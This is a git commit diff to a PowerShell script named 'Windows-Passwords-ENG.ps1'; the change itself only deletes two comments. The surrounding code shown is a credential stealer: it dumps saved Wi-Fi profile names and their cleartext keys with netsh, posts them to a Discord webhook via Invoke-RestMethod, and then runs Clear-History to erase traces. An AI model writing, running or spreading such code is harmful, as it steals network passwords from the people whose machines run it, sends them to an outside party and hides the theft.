3fde6c2e7e32ebaa2cc5a88cdcf97235756a6a27
berisha9625 <mehmetcakirr44@gmail.com>
2025-10-03 16:18:26 +0300

    Update Windows-Passwords-ENG.ps1

--- Windows-Passwords-ENG.ps1
+++ Windows-Passwords-ENG.ps1
@@ -1,5 +1,4 @@
 
-# ENG
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $wlan  = $_.Matches.Value
     $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+'
@@ -12,5 +11,5 @@ netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEac
 	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
 }
 
-# Clear the PowerShell command history
+
 Clear-History
